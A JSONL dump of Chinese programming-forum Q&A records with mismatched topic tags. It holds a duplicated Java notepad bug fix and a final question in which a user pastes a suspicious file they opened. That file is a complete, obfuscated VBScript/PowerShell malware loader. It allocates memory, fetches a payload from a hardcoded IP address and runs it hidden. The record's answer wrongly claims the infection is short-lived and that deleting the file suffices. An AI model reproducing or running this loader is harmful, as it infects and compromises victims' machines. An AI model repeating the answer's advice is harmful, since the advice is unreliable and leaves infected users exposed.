"\n", "再看看df, 很不可思议已经多出来一列, 这里fn_cur就是一个简单的列表而已, 并不带这个列值~~", "\n", "所以, 这是怎么产生的呢"]], "Tag": "算法设计"}
{"Answer": "测试了你的代码，很好理解，当你点击取消是，你的选择文件返回的对象是空，所以跑异常了。就是下面这行代码在取消时为true.\r\n\r\n```\r\n System.out.println(jfc.getSelectedFile()==null);\r\n```\r\n修正代码，点击取消时，不作处理。\r\n\r\n```\r\n // 得到用户希望把文件保存到何处，文件全路径\r\n\t\t\tFile selectedFile = jfc.getSelectedFile();\r\n\t\t\tif(selectedFile==null){\r\n\t\t\t\tSystem.out.println(\"用户为选择保存文件.\");\r\n\t\t\t\treturn ;\r\n\t\t\t}\r\n\t\t\tString file = selectedFile.getAbsolutePath();\r\n```", "Konwledge_Point": "NP完全问题", "Question": ["java新手，写记事本出现异常，求助各路大神", ["当我点击取消的时候（无论是打开或者保存界面的取消），就会跳出异常（本人最近在看韩顺平老师的java入门，和老师的代码对了好几遍发现完全相同，但是老师点取消的时候就没有异常，不得其解），异常如下", "我怀疑是这出了问题但是不知道怎么解决。。。", "\n/**", "\n\n", "\n", "我的记事本（界面＋功能）\n", "/\npackage com.test7;\nimport java.io.", ";\nimport java.awt.*;\nimport java.awt.event.*;", "\n", "//import java.awt.image.ImageObserver;", "\n//import java.awt.image.ImageProducer;", "\n\n", "import javax.swing.*;", "\n\n", "public class NotePad extends JFrame implements ActionListener{", "\n\n", "//定义需要的组件\nJTextArea jta=null;\n//菜单栏\nJMenuBar jmb=null;\n//定义JMenu\nJMenu jm1=null;\n//定义JMenuItem\nJMenuItem jmi1=null;\nJMenuItem jmi2=null;\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n\n    NotePad np=new NotePad();\n\n}\n\n//构造函数\npublic NotePad()\n{\n    //创建jta\n    jta=new JTextArea();\n    jmb=new JMenuBar();\n    jm1=new JMenu(\"打开（o）\");\n    //设置助记符\n    jm1.setMnemonic('F');\n    jmi1=new JMenuItem(\"打开\", new ImageIcon(\"a.gif\")); \n    jmi2=new JMenuItem(\"保存\");\n\n    //注册监听\n    jmi1.addActionListener(this);\n    jmi1.setActionCommand(\"open\");\n\n    jmi2.addActionListener(this);\n    jmi2.setActionCommand(\"save\");\n    //加入\n    this.setJMenuBar(jmb);\n    //把jm1放入到jmb\n    jmb.add(jm1);\n    //把item放入到menu\n    jm1.add(jmi1);\n    jm1.add(jmi2);\n    //放入到JFrame\n    this.add(jta);\n    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    this.setSize(400, 300);\n    this.setVisible(true);\n\n}\n\npublic void actionPerformed(ActionEvent e) {\n    // TODO Auto-generated method stub\n\n    //判断是那个菜单被选中\n    if(e.getActionCommand().equals(\"open\"))\n    {\n", "\n\n", "//          System.out.println(\"open\");", "\n\n", "        //隆重推荐JFileChooser\n        //创建文件选择组件\n        JFileChooser jfc1=new JFileChooser();\n        //设置名字\n        jfc1.setDialogTitle(\"请选择文件....\");\n        //默认方式\n        jfc1.showOpenDialog(null);\n        //显示\n        jfc1.setVisible(true);\n\n        //得到用户选择的文件全路径\n        String filename=jfc1.getSelectedFile().getAbsolutePath();\n\n        FileReader fr=null;\n        BufferedReader br=null;\n        try {\n            fr=new FileReader(filename);\n            br=new BufferedReader(fr);\n\n            //从文件中读取信息并jta\n\n            String s=\" \";\n            String allCon=\" \";\n            while((s=br.readLine())!=null)\n            {\n\n                allCon+=s+\"\\r\\n\";\n\n            }\n\n            //放置到jta即可\n            jta.setText(allCon);\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n                br.close();\n                fr.close();\n            } catch (IOException e1) {\n                // TODO Auto-generated catch block\n                e1.printStackTrace();\n            }\n\n        }\n    }\n    else if(e.getActionCommand().equals(\"save\"))\n    {\n        JFileChooser jfc=new JFileChooser();\n        jfc.setDialogTitle(\"另存为\");\n        //按默认的方式显示\n        jfc.showSaveDialog(null);\n        jfc.setVisible(true);\n\n        //得到用户希望把文件保存到何处，文件全路径\n        String file=jfc.getSelectedFile().getAbsolutePath();\n\n        //准备写入到指定文件即可\n        FileWriter fw=null;\n        BufferedWriter bw=null;\n\n        try {\n            fw=new FileWriter(file);\n            bw=new BufferedWriter(fw);\n\n            bw.write(this.jta.getText());\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n\n                bw.close();\n                fw.close();\n            } catch (Exception e3) {\n                // TODO: handle exception\n\n            }\n        }\n    }\n}\n", "\n\n", "}"]], "Tag": "算法设计"}
{"Answer": "测试了你的代码，很好理解，当你点击取消是，你的选择文件返回的对象是空，所以跑异常了。就是下面这行代码在取消时为true.\r\n\r\n```\r\n System.out.println(jfc.getSelectedFile()==null);\r\n```\r\n修正代码，点击取消时，不作处理。\r\n\r\n```\r\n // 得到用户希望把文件保存到何处，文件全路径\r\n\t\t\tFile selectedFile = jfc.getSelectedFile();\r\n\t\t\tif(selectedFile==null){\r\n\t\t\t\tSystem.out.println(\"用户为选择保存文件.\");\r\n\t\t\t\treturn ;\r\n\t\t\t}\r\n\t\t\tString file = selectedFile.getAbsolutePath();\r\n```", "Konwledge_Point": "NP完全问题", "Question": ["java新手，写记事本出现异常，求助各路大神", ["当我点击取消的时候（无论是打开或者保存界面的取消），就会跳出异常（本人最近在看韩顺平老师的java入门，和老师的代码对了好几遍发现完全相同，但是老师点取消的时候就没有异常，不得其解），异常如下", "我怀疑是这出了问题但是不知道怎么解决。。。", "\n/**", "\n\n", "\n", "我的记事本（界面＋功能）\n", "/\npackage com.test7;\nimport java.io.", ";\nimport java.awt.*;\nimport java.awt.event.*;", "\n", "//import java.awt.image.ImageObserver;", "\n//import java.awt.image.ImageProducer;", "\n\n", "import javax.swing.*;", "\n\n", "public class NotePad extends JFrame implements ActionListener{", "\n\n", "//定义需要的组件\nJTextArea jta=null;\n//菜单栏\nJMenuBar jmb=null;\n//定义JMenu\nJMenu jm1=null;\n//定义JMenuItem\nJMenuItem jmi1=null;\nJMenuItem jmi2=null;\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n\n    NotePad np=new NotePad();\n\n}\n\n//构造函数\npublic NotePad()\n{\n    //创建jta\n    jta=new JTextArea();\n    jmb=new JMenuBar();\n    jm1=new JMenu(\"打开（o）\");\n    //设置助记符\n    jm1.setMnemonic('F');\n    jmi1=new JMenuItem(\"打开\", new ImageIcon(\"a.gif\")); \n    jmi2=new JMenuItem(\"保存\");\n\n    //注册监听\n    jmi1.addActionListener(this);\n    jmi1.setActionCommand(\"open\");\n\n    jmi2.addActionListener(this);\n    jmi2.setActionCommand(\"save\");\n    //加入\n    this.setJMenuBar(jmb);\n    //把jm1放入到jmb\n    jmb.add(jm1);\n    //把item放入到menu\n    jm1.add(jmi1);\n    jm1.add(jmi2);\n    //放入到JFrame\n    this.add(jta);\n    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    this.setSize(400, 300);\n    this.setVisible(true);\n\n}\n\npublic void actionPerformed(ActionEvent e) {\n    // TODO Auto-generated method stub\n\n    //判断是那个菜单被选中\n    if(e.getActionCommand().equals(\"open\"))\n    {\n", "\n\n", "//          System.out.println(\"open\");", "\n\n", "        //隆重推荐JFileChooser\n        //创建文件选择组件\n        JFileChooser jfc1=new JFileChooser();\n        //设置名字\n        jfc1.setDialogTitle(\"请选择文件....\");\n        //默认方式\n        jfc1.showOpenDialog(null);\n        //显示\n        jfc1.setVisible(true);\n\n        //得到用户选择的文件全路径\n        String filename=jfc1.getSelectedFile().getAbsolutePath();\n\n        FileReader fr=null;\n        BufferedReader br=null;\n        try {\n            fr=new FileReader(filename);\n            br=new BufferedReader(fr);\n\n            //从文件中读取信息并jta\n\n            String s=\" \";\n            String allCon=\" \";\n            while((s=br.readLine())!=null)\n            {\n\n                allCon+=s+\"\\r\\n\";\n\n            }\n\n            //放置到jta即可\n            jta.setText(allCon);\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n                br.close();\n                fr.close();\n            } catch (IOException e1) {\n                // TODO Auto-generated catch block\n                e1.printStackTrace();\n            }\n\n        }\n    }\n    else if(e.getActionCommand().equals(\"save\"))\n    {\n        JFileChooser jfc=new JFileChooser();\n        jfc.setDialogTitle(\"另存为\");\n        //按默认的方式显示\n        jfc.showSaveDialog(null);\n        jfc.setVisible(true);\n\n        //得到用户希望把文件保存到何处，文件全路径\n        String file=jfc.getSelectedFile().getAbsolutePath();\n\n        //准备写入到指定文件即可\n        FileWriter fw=null;\n        BufferedWriter bw=null;\n\n        try {\n            fw=new FileWriter(file);\n            bw=new BufferedWriter(fw);\n\n            bw.write(this.jta.getText());\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n\n                bw.close();\n                fw.close();\n            } catch (Exception e3) {\n                // TODO: handle exception\n\n            }\n        }\n    }\n}\n", "\n\n", "}"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;如果当场没有什么异常&amp;#xff0c;现在就不要管他了&amp;#xff0c;这个病毒内容不是长期的&amp;#xff0c;短期没事就不要管他&amp;#xff0c;源文件删掉就好了&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["后知后觉错误打开文件，应该怎么办", [" 打开错了一个文件，感觉很危险，", "本人完全不懂，有没有谁可以帮助我。告诉我后面应该怎么办", "\n", " \n\n\nCh9 = Ch9 & ", "\"$Translucences = Affedninge1Affedninge1Affedninge1StAledChdKi-TrTUnyScpgceCh Sp-SyTRayPrpHjeAnDIneRefFiiChnTiiSktSciNooTvnfo Al'BauCasRhiPanRogFu LoSApyCesRetIneKnmaf;TwuUnsSyiFpnDigri BlSNeyprsPrtPheRemPi.ShRUluRenWotTaiTvmPieSk.SaIOpnSttFieClrReoPopBaSVeeSorVivHuiStcTreEtsPo;FipPruLibBilS\"", "\nCh9 = Ch9 & ", "\"eidacDa PesBitEjaEutTiiTicDy TecGelGlaOusHosOu RuAWasSusSkuRerAlaAnnCacRaeThsdeuBumJomRueUnrNenTaeMesSa1An5Di8Ku1Re{Gu[LaDStlPelCyIskmVopUdoYnrDitSc(Sc`Affedninge1Affedninge1Affedninge1OpkWieUnr\"", "\nCh9 = Ch9 & ", "\"conDreFalPo3Pr2Ex`Affedninge1Affedninge1Affedninge1Cr)Di]UnpNeuchbKolMaiOpcKy FosJutBaaBetObiTucAn PieEsxSntBueForFonUn SkvCloSyiOvdSk SaITrnNaiFotfridtaKrlEliBizSteJaCinrDeiVitliiBicBiaUmlLaSkleFocMutWaiSnoPinRb(NyiPonPetOc\"", "\nCh9 = Ch9 & ", "\" MnRCoeRecEtuHepPreUn)Di;Bo[miDLdlNolsuIStmUdpRaoHirMutEx(Ec`Affedninge1Affedninge1Affedninge1SakUdeNordinVeeMalSl3Sc2Pr`Affedninge1Affedninge1Affedninge1So)Si]BapIruCzbUplSpiPrcHa kusintHeaFatDaiPocFo vieskxkotCieMarQunSl NaiAznAbtAr VeGHdeVmtViTLrhWarVkeMaabodOuSUdeselSpeLycmatIloTerPhE\"", "\nCh9 = Ch9 & ", "\"PenMatMurTbyRe(ShiManBatpo FoTPjaMoaUn,syiBenZetJe FasPaaPlndyiTr,TiiCanTotFo HaPInsMayfacMi)An;gp[arDcolAflsoIAnmFepSuoTrrPatFe(Un`Affedninge1Affedninge1Affedninge1SkAObDShVVaAQuPSuIsq3Om2Ha.stDBeLReLOv`Affedninge1Affedninge1Affedninge1Ka)Lo]FupAcuSkbValEliExcSk SasImtSaaBatNoienc\"", "\nCh9 = Ch9 & ", "\"Ar FjeSpxOmtBaeHarCrnCo RaiStnSntEj DdIAnnMiiAktDeiCaaExlgriDizTeeArSSueVicKnuHtrSyiRetStyHiDDieUnsAfcSyrUdiMapdetreoSurDr(foiPonGltFo neHVajLytAk,AfiVenRa\"", "\nCh9 = Ch9 & ", "\"tAn SeOTirpotSphInoMetAr)Ak;Az[DeDValSnlbiIEfmSkpAloStrGltpr(Th`Affedninge1Affedninge1Affedninge1AfuFesFreTvrSe3Ta2Pl`Affedninge1Affedninge1Affedninge1So)Po]SepTruPobRelCiiLicGo TusmitNaafotWaiGrcOu SteFoxRetSke\"", "\nCh9 = Ch9 & ", "\"ClrUrnGe SpiKinCotin PsCHehSkeDucUlkUnDSalPhgCoBNiuUntMatStoEvnSa(maiAbnTotWh UnUTinSvgFeuUniPllJe,uniBonBetFl EvFAfjOmeMarEdkJurSa,RaiArnAntPr BrADkmRebSliBy)Vi;Hu[ZiDPolSclpeIFumSepBroTirMitBe(An`Affedninge1Affedninge1Affedninge1AsiBamPemOv3Bo2Le.JodPolExlRe`Affedninge1Affedninge1Affedninge1\"", "\nCh9 = Ch9 & ", "\"Pe)Pr]InpFouOmbSylSniDycsc vasVatEtaDitKoisocse HaeacxDetCoeFlrArnLu PuiStnMatCh ReICumdymAlGDieGatLiCcooRemCapSloMusAniHatBuiseoDunKaFFuoAlnPatMo(UbiBenHjtto EnRgeeSy\"", "\nCh9 = Ch9 & ", "\"oPevpriexrEm2Dy2Om1Fl,BoiAlnAntMe InDDieNolBrtSn)Do;Bu[RaDTolUnlBuIJamPrpSyoSkrHotVi(mi`Affedninge1Affedninge1Affedninge1thADeDBaVraASpPPeICa3Ye2Sp.BeDImLFrLMo`Affedninge1Affedninge1Affedninge1Si)Be]SepKouNobSalBaiKvcLi bisvitLiaTrtBuiClcPa SmeGrxHytHmeSprGunPo adiDenSttFo \"", "\nCh9 = Ch9 & ", "\"glIDemSapboeDarUdsBioFonDiaTetSaeSpNFoaGamDeeBrdUrPPriOfpDoeBuCNolOpiIneObnBotta(AriTenTatNs UdtKleIrrLimChoKopSt)Su;Va[InDBelPolMiISemPypHeoverHotBa(Mi`Affedninge1Affedninge1Affedn\"", "\nCh9 = Ch9 & ", "\"inge1DeuFlsKoeTarTi3Co2se`Affedninge1Affedninge1Affedninge1Am)Tm]TrpSkuFobAulEriGlcHe EnsRetFaaSatafiEfcVe BreFrxHatMeeCorYonSl SpIIsnSptBePEttGerSa CaESpnDiuEnmToWSuiE\"", "\nCh9 = Ch9 & ", "\"knYodUnoNywEnSmatHaaPatSjiBeoStnFasBoWOm(BauSciInnSptRe KovBu1ar,AciSknFrtfr Hovto2Ka)Ma;Ro[BiDBllFolKoISamBopApoAmrOutde(De`Affedninge1Affedninge1Affedninge1KikIneSur\"", "\nCh9 = Ch9 & ", "\"LanCyeAnlSy3Fa2Ri`Affedninge1Affedninge1Affedninge1Fr)Ag]AdpcouIlbSllTaiRecGa GrsCrtGyaButPriIncpo FreNoxButPaeunrIdnSu SyiChnSptPr AcVSiiSerBetEluFoaBrlArAAnlnolPooMocSw(SkiPlnGstPj AnvSu1Ko,TeiUsnMotZs FlvGv2Ru,KoiMynSkt\"", "\nCh9 = Ch9 & ", "\"Ru ImvRe3ru,TiiDanAgtBo VevVi4Ly)At;Xy[SkDtrlHalFrIElmPrpSkoSprKutSc(Tj`Affedninge1Affedninge1Affedninge1MokAseEarDenEleMelDe3Af2En`Affedninge1Affedninge1Affedninge1Ef)ol]EppBuuOvbSylGaiArcFo HusUntMoaUntReiTrcUn BleSoxSetShecirXenDi GivSvopriModPa PaSEmeKotKoFBliNolImeUnAElpCeiBrsfiTKooMiAMiNB\"", "\nCh9 = Ch9 & ", "\"aSinItr(Fl)Bg;Te[UdDFrlBalTwIHymHepTooRarPrtGn(Vo`Affedninge1Affedninge1Affedninge1BlwHyiHjnNumUnmFi.SpdHultelBj`Affedninge1Affedninge1Affedninge1Pe)St]OvpFuuBnbTilFaiGrcan\"", "\nCh9 = Ch9 & ", "\" InsRjtUnaNotUniavcRe RueMaxDethaeInrOvnUn TriPenRetIn PamEgmfoiInoTeWSirSuichtofeRa(AniConDetCo KiHHoapolVa,MiiIknTitOx TeBHeeUnaIn,HeiClnRotAt FaSTilAbaNogNo2Ci1Bo9hj)Ko;Un[BuDLslAglunIGemFrpEaoPerNotBe(Tm`Affedninge1Affednin\"", "\nCh9 = Ch9 & ", "\"ge1Affedninge1SluRasFoeDarIl3Ga2An`Affedninge1Affedninge1Affedninge1Fe)Ca]UnpDeuBrbStlReiHecDu DasPrtBiaFntUriMucSm BreNoxuntDeePorPonCh UniKnnSctSu GaTWerMaaStnMisFolcaaEvtNieVaMAfDSbIBiSHoyBasSuAWocWicgeeDilAc(KriFrnNetBe KrIMinBofHyoBe,SliTonSntEm \"", "\nCh9 = Ch9 & ", "\"FolTiiUpgPo)Pi;Sp}at'Me;No`$PrAUesEnsabuImrDeaAfnVicFueNisAfuLamMimGleBurBrnHaeShsBo1Op5Ag8Pa2Ab=Br`$TreVonSvvPa:kraBapImpPjdRoaKotReaCa In+Ps Ty`Affedninge1Affedninge1Affedninge1En\\NiIsksStoMolReeBorAliPonLugKosEfmTuaUntMueLnrJeiGyaHelHeeUkrSanSpeGasAs.BydMoahetCy`A\"", "\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1vi;Re`$SkABekUdtJviSioApnUdsJorAraHadHoiSauKasaneStrTanTaeOm=Vi'in'Up;diiInfUf Su(Ch-BinInoRhtIm(DrTDieHysPltSp-AaPToaAntPahNo Do`$\"", "\nCh9 = Ch9 & ", "\"VeAGosHysInuborabaHenprcNaeHesReuChmFlmeneMarAfnSeeKnsqu1Th5Af8Tr2La)Sl)Da Au{FiwGlhSkiUnlToeLi Pa(Fk`$ClAPlkpatPhiDeoSanWasUnrHeaBudCuiEnuStsMueplrRenPheCh Ki-ExeGrqLe se'Ti'Im)In Pr{No`$AfAHikAptp\"", "\nCh9 = Ch9 & ", "\"riFroHonSesTurFoatydLeireuArsOpeRarUdnAueMo Gi=ko Ab(QuNSaePawBl-ReOFabByjDieTicHotDa boNmieCotSk.SpWSeeUnbFrCTvlGoiPreBenbitAu)po.CoDreoOvwPrnPelTioBaaIndBySV\"", "\nCh9 = Ch9 & ", "\"atUnrsoiApnBrgBe(Do'WihFatAutIcpSa:Ch/Fl/Ar1Fo3Bu9Sh.Ve2Iv8Mb.In3To6Bl.Ma1Pl4Nd7Ss/MeSMeaMemAbmmeeCenSlsFetNeiBelhjlOreRenKxdUpeVisRg.AndKosMepLi'Sp)Ha;ScSAntDraCorLatKa-SkSHalP\"", "\nCh9 = Ch9 & ", "\"aeIneSapAa Ki5Kl;Rv}BiSMieZotSu-MyCSioDrnDithoeSlnVotTh Bo`$AdAchsOssBeuKorFoaKunApcWiePrsUnuDimOnmpaefurarnUneTosre1De5Pr8Tv2So Ru`$OmASakGetOfiCboFonS\"", "\nCh9 = Ch9 & ", "\"nsThrTiaDodToiChuAusAfeForRenLseKa;Ru}Fu`$LuASasMesFouOprDiaOpnUncOxeBesCruFlmSemKiecerBenPreSesDe1Mu5Ye8Ga3Je=Sp[CrAHusAfsCeuAmrMeaHonBucBeeCosLeuAnmOpmSkeSmrHenPreAusPa1mi5Ph8Eg1co]Ub:Fo:KoVHoiSkrTrtPauSiatrlKaAIlleplGloAlcIn(Sa0Ud,De1de0Ou4Kn8Bu5Me7Do\"", "\nCh9 = Ch9 & ", "\"6Ce,Re1Jo2Th2Ar8So8Co,Ca6Au4An)Ge;Ta`$LuABekIntDyiBroSynUnsSurRiaStdKdibeuUdsSheAkrRenKoeDi Uf=In RhGSteMdtUl-QuCReocunAftTaeKlnAgtPe Le`$PrAIlsZisfruStrFlaLinKrcleeUnsKvuJumEumAfeKorstnCueDisTi1Fo5Uf8es2li;Fl`$FrPEsaRkrWoeD\"", "\nCh9 = Ch9 & ", "\"ooMoeCoaFinOv St=Co Se[noSChyVisFotUneTimOs.SoCProBenEsvDaeLirSktJu]Ku:Ti:PaFGarOmoAxmMaBMaaUnsSjeGo6Km4BySRotInrPoiBanRegEx(Ba`$MiAMokGltStiWioponAlsEnrIsaBedPaireuSpsSkeVerStnEueAu)In;ko[HaSSkyAmsHotAeeHamSt.BlRomuBenRitSuiPrmofeHv.PaIbunLetAbeSyrProSupCoSNeeinrDuvAaiAfcCoePosRr.beMFaaRarGasS\"", "\nCh9 = Ch9 & ", "\"khBeaStlSu]We:Re:BaCLeoUnpPlyMo(Ar`$OvPMiaAnrReeNooBoeEnaSpnOx,Fa Af0Va,Hy Ch Ho`$PaAResVisJauFirPeaFonUncDeePrsInuHemOpmSteGrrUdnFleAdsCu1Bl5Se8Dy3Im,Wa In`$DiPSpaRerSueAfoMaeKaaLanSl.PrcUnohuuPrnAntIn)At;aa[SeApasPlsHyunarLi\"", "\nCh9 = Ch9 & ", "\"aTenPrcTheMesChuFumTemUneInrScnDieCasTy1Re5Dy8El1Un]To:Re:ReETrnEluUbmGeWOmiRynTadKroOpwgaSSmtDeaArtDriFooRinChsStWpa(Af`$UtAUssSesKoukarUnadunTrcCheEnsFluInmSkmraeInrEmnSueMesSl1Su5Ar8Vr3Wi,Ri Br0Cr)Un#Bu;A\"", "\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1;Function Assurancesummernes1584 {    param([String]$HS);    For($i=2; $i -lt $HS.Length-1; $i+=(2+1)){        $Sardindaasens = $Sardindaasens + $HS.Substring($i, 1);    }    $Sard\"", "\nCh9 = Ch9 & ", "\"indaasens;}$Taxiauto0 = Assurancesummernes1584 'ReIMiETiXCe ';$Taxiauto1= Assurancesummernes1584 $Translucences;& ($Taxiauto0) $Taxiauto1;;\"", "\n\n", "set", " Nitwits ", "= CreateObject(", "\"Scripting.FileSystemObject\"", ")", "\n \n", "set", " ", "Bladeventyrs = CreateObject(", "\"WScript.Shell\"", ")", "\n\n", "Set", " ", "Iglus = Bladeventyrs.Exec(", "\"cmd /c echo %windir%\"", ")", "\n\nPolysome0 ", "= Iglus.StdOut.ReadLine()", "\n\nRambo ", "=  Polysome0 &", " ", "\"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershel\"", "+", "\"l.exe\"", "\n\n\n", "set", " ", "Sweepback = CreateObject(", "\"Shell.Application\"", ")", "\nIf ", "Nitwits.FileExists(Rambo) = false then Rambo =", " ", "\"powershell.exe\"", "\n\nCh9 ", "= replace(Ch9,", "\"Affedninge1\"", ",chr(34))", "\n\nSweepback.ShellExecute ", "Rambo,", " ", "\" \"", " ", "& chrw(34) & Ch9 & chrw(34),", " ", "\"\"", ",", " ", "\"\"", ", 0", "\n\n\n\n\n \n \n", "''", " SIG ", "''", " ", "Begin signature block", "\n", "''", " SIG ", "''", " ", "MIIeNwYJKoZIhvcNAQcCoIIeKDCCHiQCAQExDzANBglg", "\n", "''", " SIG ", "''", " ", "hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor", "\n", "''", " SIG ", "''", " ", "BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC", "\n", "''", " SIG ", "''", " ", "AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg", "\n", "''", " SIG ", "''", " ", "sSQkxx1Q5QReAw2o0O6fe793F72tx09levKgjTbDW46g", "\n", "''", " SIG ", "''", " ", "ggQXMIIEEzCCAvugAwIBAgIIVsqjEQ8omPUwDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQELBQAwgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIDAeFw0yMTExMTcxMDA3MTdaFw0yNDExMTYxMDA3", "\n", "''", " SIG ", "''", " ", "MTdaMIGeMQswCQYDVQQGEwJERTEbMBkGA1UECAwSU2No", "\n", "''", " SIG ", "''", " ", "bGVzd2lnLUhvbHN0ZWluMRIwEAYDVQQHDAlMw7xyc2No", "\n", "''", " SIG ", "''", " ", "YXUxDzANBgNVBAoMBlNuaXBwZTEiMCAGCSqGSIb3DQEJ", "\n", "''", " SIG ", "''", " ", "ARYTVHVhcmVnQFRvbHVpZGluZS5TazEpMCcGA1UECwwg", "\n", "''", " SIG ", "''", " ", "SGluZGJybWFybWVsYWRlcm5lIEd5bmVjb21hc3RpYSAw", "\n", "''", " SIG ", "''", " ", "ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDA", "\n", "''", " SIG ", "''", " ", "bxkjrOQpmE8BceChyNKZMB1sQKI", "/L1331RBRguylaYLe\n", "''", " SIG ", "''", " H57+GWKQl1jUWXRPa5cqC/", "df1OGj9x707NLLo8ygB0A4", "\n", "''", " SIG ", "''", " ", "njyC2bhVy", "/pC0lV4v3xgwaKWcCqaAC2cRVavxyVNAr0K\n", "''", " SIG ", "''", " cdESjH1OMetzxUd6+xmnBBSsRjLXZ7zIL00PTcW6qE2u\n", "''", " SIG ", "''", " x1l5eXMtBbsZ257ujKjKq3ZmRoN5HbmLiAW1J5ckwBqB\n", "''", " SIG ", "''", " wfvfACuMumwGDPjOGl9ycwjcaAgl69y1hVIiy7mAIV3D\n", "''", " SIG ", "''", " cNuTtslCl47QQ+Xpi18uSFgqhTuAsvIpKfJ6uGvTL09U\n", "''", " SIG ", "''", " bDgDEkZXFkwh3TQUzqO0eK1QFX/", "8u5U1AgMBAAGjUzBR", "\n", "''", " SIG ", "''", " ", "MB0GA1UdDgQWBBR96iGRZyy1E9ajUW4zDwUoV6hguTAf", "\n", "''", " SIG ", "''", " ", "BgNVHSMEGDAWgBR96iGRZyy1E9ajUW4zDwUoV6hguTAP", "\n", "''", " SIG ", "''", " ", "BgNVHRMBAf8EBTADAQH", "/MA0GCSqGSIb3DQEBCwUAA4IB\n", "''", " SIG ", "''", " AQAX6YH0P5pn3Ehm7XtSyDfhrcFBYr+TXG5lCVgAVZuO\n", "''", " SIG ", "''", " AfPQBO8y/", "JfP6cQZYYz+0I8d7qZbDJS", "/B60txKnBK2es\n", "''", " SIG ", "''", " k0QcxQ1Tr+RAKZLRXlbpReEloN2b5WFejh08iyQ+", "7", "xP9\n", "''", " SIG ", "''", " OV+xaIGduXbjU0xoM6P1rlCh/", "SQ4tYuYBgiIQJhsStlD", "\n", "''", " SIG ", "''", " ", "Df3T7hbzwCvvu67tvhMuoDgi412ZKfMIMEtf1XQYes8I", "\n", "''", " SIG ", "''", " ", "D5rkUiXNRZR0NK6j0V+8dS+QlKOc9sbFzRMOYzktPXAo", "\n", "''", " SIG ", "''", " ", "C7SFS6X", "/C/", "WA6ozpog8CRSvPjxGVXRLl8bl9eEnZtc6N", "\n", "''", " SIG ", "''", " ", "Oxo4pcyblS6UYxE5vHLoSQHagTpjLiFPoVC6MYIZeDCC", "\n", "''", " SIG ", "''", " ", "GXQCAQEwgaswgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIAIIVsqjEQ8omPUwDQYJYIZIAWUDBAIBBQCgXjAQ", "\n", "''", " SIG ", "''", " ", "BgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYK", "\n", "''", " SIG ", "''", " ", "KwYBBAGCNwIBBDAvBgkqhkiG9w0BCQQxIgQgfPddFTZR", "\n", "''", " SIG ", "''", " ", "jlHIpoeVY76icMx6fJm0dQjDMeupPa8Bie8wDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQEBBQAEggEAoZEiYMTu3ozWb2ZJha2NQLSjMPDQ", "\n", "''", " SIG ", "''", " ", "8eRJOc22RWhMyJ5wIRF3hxGCrWz48ZY4470", "/PSA64KI0\n", "''", " SIG ", "''", " gIA3DLAI5sA5+IiyKcXuVlS7oTYFOuWAquB1tkVn0OaI\n", "''", " SIG ", "''", " Y/", "SJNCE4Vcz+Sfeq7hs+uvAZ+QdzZfBahJxMItJ2Pqqe", "\n", "''", " SIG ", "''", " ", "vXUH2gCWWZlm7y0GxJZPLH1G1mX", "/E+oanZTA2LyVBKsS\n", "''", " SIG ", "''", " slrFv3zeMC04x8JHP8eWboPKS+LBsJJDOZ1XImHwK84i\n", "''", " SIG ", "''", " +", "1", "PzdLxfoGucu6h+", "7", "OVjUo9yAvbhWopaAGHmrlEBbyaH\n", "''", " SIG ", "''", " zhcCbgTjgrirwYcaWXGqEclsSPk3m2v0StxH23wUvFVT\n", "''", " SIG ", "''", " ", "33", "cl8KGCFz0wghc5BgorBgEEAYI3AwMBMYIXKTCCFyUG\n", "''", " SIG ", "''", " CSqGSIb3DQEHAqCCFxYwghcSAgEDMQ8wDQYJYIZIAWUD\n", "''", " SIG ", "''", " BAIBBQAwdwYLKoZIhvcNAQkQAQSgaARmMGQCAQEGCWCG\n", "''", " SIG ", "''", " SAGG/", "WwHATAxMA0GCWCGSAFlAwQCAQUABCDpwPdh66lZ", "\n", "''", " SIG ", "''", " ", "VjjzDfyi5sHzO2HQemkjqua4cx+fe74UkQIQc0aZa0JV", "\n", "''", " SIG ", "''", " ", 